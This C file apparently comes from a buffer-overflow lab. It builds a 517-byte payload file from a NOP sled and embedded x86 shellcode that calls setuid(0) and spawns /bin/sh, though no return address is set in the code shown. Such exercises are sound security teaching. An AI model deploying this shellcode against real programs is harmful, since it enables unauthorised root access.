#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main(int argc,char *argv[])
{
	 char buffer[517];
 	char buf[strlen(shellcode)+1];
	strcpy(buf,shellcode);

        FILE *badfile;

        /* Initialize buffer with 0x90 (NOP instruction) */
        memset(&buffer, 0x90, 517);
	//printf("%d\n",strlen(shellcode));
	//printf("%s\n",buf);
	//printf("*****************************************************\n");
	//printf("%d",strlen(buf));


	for(int i=0;i<strlen(shellcode);++i){
	//	strncpy(buffer,shellcode,strlen(shellcode)+1);
	//	buffer[i]=shellcode[i];
	//	printf("%c\n",buf[i]);
		buffer[517 - (strlen(shellcode) + 1) + i] = buf[i];
//	        printf("%X\n",buffer[517 - (strlen(shellcode) + 1)+i]);
	}
	buffer[517 - 1] = '\0';
//	for(int i=0;i<517;++i)
//		printf("%X",buffer[i]);
        /* You need to fill the buffer with appropriate contents here */
        /* ... Put your code here ... */
        /* Save the contents to the file "badfile" */

        badfile = fopen(argv[1], "w");

        fwrite(buffer, 517, 1, badfile);

	//(*(void(*)()) shellcode)();
	fclose(badfile);

	return 0;
}
